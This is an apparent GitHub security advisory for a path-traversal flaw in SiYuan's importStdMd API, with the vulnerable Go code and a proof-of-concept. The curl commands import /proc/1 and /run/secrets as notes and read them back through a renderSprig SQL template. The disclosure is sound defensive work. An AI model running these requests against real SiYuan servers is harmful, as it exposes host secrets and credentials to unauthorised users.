# [M] SiYuan importStdMd: unvalidated localPath imports arbitrary host directories as persistent notes

## Summary
Severity: Medium
Advisory: GHSA-rjhh-m223-9qqv
CVE: CVE-2026-32750
CWE: CWE-22, CWE-552
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-rjhh-m223-9qqv
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan` — affected >=0

## Details
### Summary
POST /api/import/importStdMd passes the localPath parameter directly to model.ImportFromLocalPath with zero path validation. The function recursively reads every file under the given path and permanently stores their content as SiYuan note documents in the workspace database, making them searchable and accessible to all workspace users.

### Details
File: kernel/api/import.go - function importStdMd

```go
func importStdMd(c *gin.Context) {
    notebook  := arg["notebook"].(string)
    localPath := arg["localPath"].(string)
    toPath    := arg["toPath"].(string)

    err := model.ImportFromLocalPath(notebook, localPath, toPath)
}
```

model.ImportFromLocalPath (kernel/model/import.go:784):
```go
func ImportFromLocalPath(boxID, localPath string, toPath string) (err error) {
    filelock.Walk(localPath, func(currentPath string, d fs.DirEntry, ...) error {
    })
}
```

Unlike globalCopyFiles, there is no blocklist at all. Any readable path is accepted. The imported content is permanently stored in the workspace SQLite database and survives restarts.

Chained attack with Bug #1 (renderSprig):
Admin imports sensitive files --> content stored in blocks table --> non-admin user queries via querySQL through renderSprig.

### PoC
```bash
docker run -d --name siyuan -p 6806:6806 \
  -v $(pwd)/workspace:/siyuan/workspace \
  b3log/siyuan --workspace=/siyuan/workspace --accessAuthCode=test123
```

**Exploit:**
```bash
TOKEN="YOUR_ADMIN_TOKEN"

NOTEBOOK=$(curl -s -X POST http://localhost:6806/api/notebook/createNotebook \
  -H "Authorization: Token $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"Exfil"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['notebook']['id'])")

curl -s -X POST http://localhost:6806/api/import/importStdMd \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"notebook\":\"$NOTEBOOK\",\"localPath\":\"/proc/1\",\"toPath\":\"/\"}"

curl -s -X POST http://localhost:6806/api/import/importStdMd \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"notebook\":\"$NOTEBOOK\",\"localPath\":\"/run/secrets\",\"toPath\":\"/\"}"

curl -s -X POST http://localhost:6806/api/template/renderSprig \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":"{{range $r := (querySQL \"SELECT content FROM blocks LIMIT 50\")}}{{$r.content}}\n---\n{{end}}"}'
```

### Impact
An admin can permanently import the contents of any readable host directory into the workspace as searchable notes. Unlike globalCopyFiles, there is no blocklist - /proc/, /etc/, /run/secrets/, /home/ are all accepted.

Data persists in the workspace database across restarts and is accessible to Publish Service Reader accounts. Combined with the renderSprig SQL injection ( separate advisory ), a non-admin user can then read all imported secrets without any additional privileges.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rjhh-m223-9qqv
- https://nvd.nist.gov/vuln/detail/CVE-2026-32750
- https://github.com/siyuan-note/siyuan/commit/13b6d3d45e83525654d120f32a3fdc5d9e95df0b
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1
